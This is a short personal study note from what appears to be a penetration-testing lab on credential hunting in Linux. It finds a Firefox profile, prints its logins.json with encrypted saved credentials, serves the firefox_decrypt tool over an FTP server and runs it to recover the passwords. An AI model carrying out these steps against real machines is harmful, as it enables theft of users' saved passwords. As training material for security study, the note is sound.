# [[Credential Hunting in Linux]]

```shell
ls -lah  
ls -l .mozilla/firefox/ | grep default
```
![[Pasted image 20260510195912.png]]
![[Pasted image 20260510195916.png]]

```shell
kira@nix01:~/.mozilla/firefox/ytb95ytb.default-release$ cat logins.json  
{"nextId":2,"logins":[{"id":1,"hostname":"<https://dev.inlanefreight.com>","httpRealm":null,"formSubmitURL":"<https://dev.inlanefreight.com>","usernameField":"email","passwordField":"password","encryptedUsername":"MEIEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECEuPp+tkcSROBBikTaPORjVYFBK/x6zuYjnhWGHhp6xu2ok=","encryptedPassword":"MEIEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECFinWQ8t9QusBBg6tPWTkhxcMRHwvfUZBs9zUh8mQ6MgpYI=","guid":"{317acef6-be5a-4df2-abfc-ce0566b6e975}","encType":1,"timeCreated":1644420310215,"timeLastUsed":1644420310215,"timePasswordChanged":1644420310215,"timesUsed":1}],"potentiallyVulnerablePasswords":[],"dismissedBreachAlertsByLoginGUID":{},"version":3}
```

```shell
git clone <https://github.com/unode/firefox_decrypt>  
cd firefox_decrypt  
sudo python3 -m pyftpdlib --port 21
```
![[Pasted image 20260510200002.png]]

```shell
python3.9 firefox_decrypt.py
```
![[Pasted image 20260510200019.png]]
